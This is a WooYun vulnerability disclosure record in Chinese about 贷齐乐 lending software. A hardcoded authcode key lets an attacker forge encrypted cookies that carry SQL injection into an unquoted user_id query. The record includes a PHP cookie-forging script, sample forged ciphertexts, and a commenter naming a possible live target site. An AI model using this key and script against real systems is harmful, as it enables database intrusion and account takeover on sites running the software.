{"id": 67006, "wybug_id": "wooyun-2015-0135449", "wybug_title": "贷齐乐加密问题导致全局注入\\任意用户登录(无视gpc/waf)", "wybug_corp": "chinaanhe.com", "wybug_author": "Xser", "wybug_date": "2015-08-20 10:33", "wybug_open_date": "2015-11-18 10:42", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-18：\t细节向公众公开  简要描述： 贷齐乐加密问题导致全局注入\\任意用户登录(无视gpc/waf)，分分钟秒站 详细说明：  出现在core/function.inc.php中\nfunction authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {\t// 动态密匙长度，相同的明文会生成不同密文就是依靠动态密匙\t$ckey_length = 4;\t// 密匙\t$key = md5($key ? $key : \"dw10c20m05w18\");\t// 密匙a会参与加解密\t$keya = md5(substr($key, 0, 16));\t// 密匙b会用来做数据完整性验证\t$keyb = md5(substr($key, 16, 16));\t// 密匙c用于变化生成的密文\t$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';\t// 参与运算的密匙\t$cryptkey = $keya.md5($keya.$keyc);\t$key_length = strlen($cryptkey);\t// 明文，前10位用来保存时间戳，解密时验证数据有效性，10到26位用来保存$keyb(密匙b)，解密时会通过这个密匙验证数据完整性\t// 如果是解码的话，会从第$ckey_length位开始，因为密文前$ckey_length位保存 动态密匙，以保证解密正确\t$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;\t$string_length = strlen($string);\t$result = '';\t$box = range(0, 255);\t$rndkey = array();\t\t// 产生密匙簿\tfor($i = 0; $i <= 255; $i++) {\t\t$rndkey[$i] = ord($cryptkey[$i % $key_length]);\t}\t\t// 用固定的算法，打乱密匙簿，增加随机性，好像很复杂，实际上对并不会增加密文的强度\tfor($j = $i = 0; $i < 256; $i++) {\t\t$j = ($j + $box[$i] + $rndkey[$i]) % 256;\t\t$tmp = $box[$i];\t\t$box[$i] = $box[$j];\t\t$box[$j] = $tmp;\t}\t\t// 核心加解密部分\tfor($a = $j = $i = 0; $i < $string_length; $i++) {\t\t$a = ($a + 1) % 256;\t\t$j = ($j + $box[$a]) % 256;\t\t$tmp = $box[$a];\t\t$box[$a] = $box[$j];\t\t$box[$j] = $tmp;\t\t// 从密匙簿得出密匙进行异或，再转成字符\t\t$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));\t}\t\t\tif($operation == 'DECODE') {\t\t// substr($result, 0, 10) == 0 验证数据有效性\t\t// substr($result, 0, 10) - time() > 0 验证数据有效性\t\t// substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16) 验证数据完整性\t\t// 验证数据有效性，请看未加密明文的格式\t\tif((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {\t\t\treturn substr($result, 26);\t\t} else {\t\t\treturn '';\t\t}\t} else {\t\t// 把动态密匙保存在密文里，这也是为什么同样的明文，生产不同密文后能解密的原因\t\t// 因为加密后的密文可能是一些特殊字符，复制过程可能会丢失，所以用base64编码\t\treturn $keyc.str_replace('=', '', base64_encode($result));\t}}\n由于系统给了加解密的方式，我只要拿到密文就可以构造注入了，由于加密后无视所有waf我们来找一处试试查看用户那里\npublic static function GetOne($data = array()){\t\tglobal $mysql;\t\t$user_id = isset($data['user_id'])?$data['user_id']:\"\";\t\t$username = isset($data['username'])?$data['username']:\"\";\t\t$password = isset($data['password'])?$data['password']:\"\";\t\t$email = isset($data['email'])?$data['email']:\"\";\t\t$type_id = isset($data['type_id'])?$data['type_id']:\"\";\t\t$sql = \"CREATE TABLE IF NOT EXISTS `{user_cache}` ( \t\t\t `user_id` int(11) NOT NULL DEFAULT '0')\";\t\t$mysql ->db_query($sql);\t\tif ($user_id == \"\" && $username == \"\") return self::ERROR;\t\t$sql = \"select p2.name as typename,p2.type,p3.*,p4.*,p5.*,p1.*  from `{user}` as p1 \t\t\t\tleft join `{user_type}` as p2 on  p1.type_id = p2.type_id \t\t\t\t\tleft join `{user_cache}` as p3 on  p3.user_id = p1.user_id \t\t\t\t\tleft join `{account}` as p4 on  p4.user_id = p1.user_id \t\t\t\t\tleft join `{userinfo}` as p5 on  p5.user_id = p1.user_id \t\t\t\t\twhere 1=1 \";\t\tif ($user_id!=\"\"){\t\t\t$sql .= \" and p1.user_id = $user_id\";\t\t}\t\t\t\tif ($password!=\"\"){\t\t\t$sql .= \" and  p1.password = '\".md5($password).\"'\";\t\t}\t\t\t\tif ($username!=\"\"){\t\t\t$sql .= \" and  p1.username = '$username'\";\t\t}\t\t\t\tif ($email!=\"\"){\t\t\t$sql .= \" and  p1.email = '$email'\";\t\t}\t\t\t\tif ($type_id!=\"\"){\t\t\t$sql .= \" and p1.type_id = '$type_id'\";\t\t}\t\treturn $mysql->db_fetch_array($sql);\t}\n可以看到user_id没有单引号包含，就算包含也没所谓，反正无视gpc和waf\n$sql .= \" and p1.user_id = $user_id\";\n脚本来构造下，因为密钥是固定的\n<?php function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {\t// 动态密匙长度，相同的明文会生成不同密文就是依靠动态密匙\t$ckey_length = 4;\t// 密匙\t$key = md5($key ? $key : \"dw10c20m05w18\");\t// 密匙a会参与加解密\t$keya = md5(substr($key, 0, 16));\t// 密匙b会用来做数据完整性验证\t$keyb = md5(substr($key, 16, 16));\t// 密匙c用于变化生成的密文\t$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';\t// 参与运算的密匙\t$cryptkey = $keya.md5($keya.$keyc);\t$key_length = strlen($cryptkey);\t// 明文，前10位用来保存时间戳，解密时验证数据有效性，10到26位用来保存$keyb(密匙b)，解密时会通过这个密匙验证数据完整性\t// 如果是解码的话，会从第$ckey_length位开始，因为密文前$ckey_length位保存 动态密匙，以保证解密正确\t$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;\t$string_length = strlen($string);\t$result = '';\t$box = range(0, 255);\t$rndkey = array();\t\t// 产生密匙簿\tfor($i = 0; $i <= 255; $i++) {\t\t$rndkey[$i] = ord($cryptkey[$i % $key_length]);\t}\t\t// 用固定的算法，打乱密匙簿，增加随机性，好像很复杂，实际上对并不会增加密文的强度\tfor($j = $i = 0; $i < 256; $i++) {\t\t$j = ($j + $box[$i] + $rndkey[$i]) % 256;\t\t$tmp = $box[$i];\t\t$box[$i] = $box[$j];\t\t$box[$j] = $tmp;\t}\t\t// 核心加解密部分\tfor($a = $j = $i = 0; $i < $string_length; $i++) {\t\t$a = ($a + 1) % 256;\t\t$j = ($j + $box[$a]) % 256;\t\t$tmp = $box[$a];\t\t$box[$a] = $box[$j];\t\t$box[$j] = $tmp;\t\t// 从密匙簿得出密匙进行异或，再转成字符\t\t$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));\t}\t\t\tif($operation == 'DECODE') {\t\t// substr($result, 0, 10) == 0 验证数据有效性\t\t// substr($result, 0, 10) - time() > 0 验证数据有效性\t\t// substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16) 验证数据完整性\t\t// 验证数据有效性，请看未加密明文的格式\t\tif((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {\t\t\treturn substr($result, 26);\t\t} else {\t\t\treturn '';\t\t}\t} else {\t\t// 把动态密匙保存在密文里，这也是为什么同样的明文，生产不同密文后能解密的原因\t\t// 因为加密后的密文可能是一些特殊字符，复制过程可能会丢失，所以用base64编码\t\treturn $keyc.str_replace('=', '', base64_encode($result));\t}} $id=\"1'\";$id = urldecode($id);$data = explode(\",\",authcode(trim($id),\"ENCODE\"));var_dump($data);?>\n\n\n838cOrPDhhyriQoFaRRiPqbbAYSTtouOtn7WvPp2rw带入cookie看看\n\n成功带入单引号，我们试试and 1=1（原谅我不会写exp这个别名语句）\n\n构造得出b593ULDqUXh/Qhm0YL6mHaHkdvIGOh7C7aqpfK5LIMo2DSlPV2or带入成功\n\n分析就到这里了   漏洞证明：  出现在core/function.inc.php中\nfunction authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {\t// 动态密匙长度，相同的明文会生成不同密文就是依靠动态密匙\t$ckey_length = 4;\t// 密匙\t$key = md5($key ? $key : \"dw10c20m05w18\");\t// 密匙a会参与加解密\t$keya = md5(substr($key, 0, 16));\t// 密匙b会用来做数据完整性验证\t$keyb = md5(substr($key, 16, 16));\t// 密匙c用于变化生成的密文\t$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';\t// 参与运算的密匙\t$cryptkey = $keya.md5($keya.$keyc);\t$key_length = strlen($cryptkey);\t// 明文，前10位用来保存时间戳，解密时验证数据有效性，10到26位用来保存$keyb(密匙b)，解密时会通过这个密匙验证数据完整性\t// 如果是解码的话，会从第$ckey_length位开始，因为密文前$ckey_length位保存 动态密匙，以保证解密正确\t$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;\t$string_length = strlen($string);\t$result = '';\t$box = range(0, 255);\t$rndkey = array();\t\t// 产生密匙簿\tfor($i = 0; $i <= 255; $i++) {\t\t$rndkey[$i] = ord($cryptkey[$i % $key_length]);\t}\t\t// 用固定的算法，打乱密匙簿，增加随机性，好像很复杂，实际上对并不会增加密文的强度\tfor($j = $i = 0; $i < 256; $i++) {\t\t$j = ($j + $box[$i] + $rndkey[$i]) % 256;\t\t$tmp = $box[$i];\t\t$box[$i] = $box[$j];\t\t$box[$j] = $tmp;\t}\t\t// 核心加解密部分\tfor($a = $j = $i = 0; $i < $string_length; $i++) {\t\t$a = ($a + 1) % 256;\t\t$j = ($j + $box[$a]) % 256;\t\t$tmp = $box[$a];\t\t$box[$a] = $box[$j];\t\t$box[$j] = $tmp;\t\t// 从密匙簿得出密匙进行异或，再转成字符\t\t$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));\t}\t\t\tif($operation == 'DECODE') {\t\t// substr($result, 0, 10) == 0 验证数据有效性\t\t// substr($result, 0, 10) - time() > 0 验证数据有效性\t\t// substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16) 验证数据完整性\t\t// 验证数据有效性，请看未加密明文的格式\t\tif((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {\t\t\treturn substr($result, 26);\t\t} else {\t\t\treturn '';\t\t}\t} else {\t\t// 把动态密匙保存在密文里，这也是为什么同样的明文，生产不同密文后能解密的原因\t\t// 因为加密后的密文可能是一些特殊字符，复制过程可能会丢失，所以用base64编码\t\treturn $keyc.str_replace('=', '', base64_encode($result));\t}}\n由于系统给了加解密的方式，我只要拿到密文就可以构造注入了，由于加密后无视所有waf我们来找一处试试查看用户那里\npublic static function GetOne($data = array()){\t\tglobal $mysql;\t\t$user_id = isset($data['user_id'])?$data['user_id']:\"\";\t\t$username = isset($data['username'])?$data['username']:\"\";\t\t$password = isset($data['password'])?$data['password']:\"\";\t\t$email = isset($data['email'])?$data['email']:\"\";\t\t$type_id = isset($data['type_id'])?$data['type_id']:\"\";\t\t$sql = \"CREATE TABLE IF NOT EXISTS `{user_cache}` ( \t\t\t `user_id` int(11) NOT NULL DEFAULT '0')\";\t\t$mysql ->db_query($sql);\t\tif ($user_id == \"\" && $username == \"\") return self::ERROR;\t\t$sql = \"select p2.name as typename,p2.type,p3.*,p4.*,p5.*,p1.*  from `{user}` as p1 \t\t\t\tleft join `{user_type}` as p2 on  p1.type_id = p2.type_id \t\t\t\t\tleft join `{user_cache}` as p3 on  p3.user_id = p1.user_id \t\t\t\t\tleft join `{account}` as p4 on  p4.user_id = p1.user_id \t\t\t\t\tleft join `{userinfo}` as p5 on  p5.user_id = p1.user_id \t\t\t\t\twhere 1=1 \";\t\tif ($user_id!=\"\"){\t\t\t$sql .= \" and p1.user_id = $user_id\";\t\t}\t\t\t\tif ($password!=\"\"){\t\t\t$sql .= \" and  p1.password = '\".md5($password).\"'\";\t\t}\t\t\t\tif ($username!=\"\"){\t\t\t$sql .= \" and  p1.username = '$username'\";\t\t}\t\t\t\tif ($email!=\"\"){\t\t\t$sql .= \" and  p1.email = '$email'\";\t\t}\t\t\t\tif ($type_id!=\"\"){\t\t\t$sql .= \" and p1.type_id = '$type_id'\";\t\t}\t\treturn $mysql->db_fetch_array($sql);\t}\n可以看到user_id没有单引号包含，就算包含也没所谓，反正无视gpc和waf\n$sql .= \" and p1.user_id = $user_id\";\n脚本来构造下，因为密钥是固定的\n<?php function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {\t// 动态密匙长度，相同的明文会生成不同密文就是依靠动态密匙\t$ckey_length = 4;\t// 密匙\t$key = md5($key ? $key : \"dw10c20m05w18\");\t// 密匙a会参与加解密\t$keya = md5(substr($key, 0, 16));\t// 密匙b会用来做数据完整性验证\t$keyb = md5(substr($key, 16, 16));\t// 密匙c用于变化生成的密文\t$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';\t// 参与运算的密匙\t$cryptkey = $keya.md5($keya.$keyc);\t$key_length = strlen($cryptkey);\t// 明文，前10位用来保存时间戳，解密时验证数据有效性，10到26位用来保存$keyb(密匙b)，解密时会通过这个密匙验证数据完整性\t// 如果是解码的话，会从第$ckey_length位开始，因为密文前$ckey_length位保存 动态密匙，以保证解密正确\t$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;\t$string_length = strlen($string);\t$result = '';\t$box = range(0, 255);\t$rndkey = array();\t\t// 产生密匙簿\tfor($i = 0; $i <= 255; $i++) {\t\t$rndkey[$i] = ord($cryptkey[$i % $key_length]);\t}\t\t// 用固定的算法，打乱密匙簿，增加随机性，好像很复杂，实际上对并不会增加密文的强度\tfor($j = $i = 0; $i < 256; $i++) {\t\t$j = ($j + $box[$i] + $rndkey[$i]) % 256;\t\t$tmp = $box[$i];\t\t$box[$i] = $box[$j];\t\t$box[$j] = $tmp;\t}\t\t// 核心加解密部分\tfor($a = $j = $i = 0; $i < $string_length; $i++) {\t\t$a = ($a + 1) % 256;\t\t$j = ($j + $box[$a]) % 256;\t\t$tmp = $box[$a];\t\t$box[$a] = $box[$j];\t\t$box[$j] = $tmp;\t\t// 从密匙簿得出密匙进行异或，再转成字符\t\t$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));\t}\t\t\tif($operation == 'DECODE') {\t\t// substr($result, 0, 10) == 0 验证数据有效性\t\t// substr($result, 0, 10) - time() > 0 验证数据有效性\t\t// substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16) 验证数据完整性\t\t// 验证数据有效性，请看未加密明文的格式\t\tif((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {\t\t\treturn substr($result, 26);\t\t} else {\t\t\treturn '';\t\t}\t} else {\t\t// 把动态密匙保存在密文里，这也是为什么同样的明文，生产不同密文后能解密的原因\t\t// 因为加密后的密文可能是一些特殊字符，复制过程可能会丢失，所以用base64编码\t\treturn $keyc.str_replace('=', '', base64_encode($result));\t}} $id=\"1'\";$id = urldecode($id);$data = explode(\",\",authcode(trim($id),\"ENCODE\"));var_dump($data);?>\n\n\n838cOrPDhhyriQoFaRRiPqbbAYSTtouOtn7WvPp2rw带入cookie看看\n\n成功带入单引号，我们试试and 1=1（原谅我不会写exp这个别名语句）\n\n构造得出b593ULDqUXh/Qhm0YL6mHaHkdvIGOh7C7aqpfK5LIMo2DSlPV2or带入成功\n\n分析就到这里了   修复方案：  过滤   版权声明：转载请注明来源 Xser@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-08-20 10:41 厂商回复： http:///  在这个站上试试吧，读读代码断章取义没什么意思的 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-20 10:53 |    \t\t%230CC \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 溜溜)\t\t \n  http:/// 这是个神马站    \n     2015-08-20 12:01 |    \t\t继续沉默 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 好好学习，天天向上)\t\t \n  说的应该是这个网站www点nbdai0574点com/     \n     2015-08-21 11:24 |    \t\t%230CC \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 溜溜)\t\t \n  这个无视gpc/waf 感觉更有意思 MAKE    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}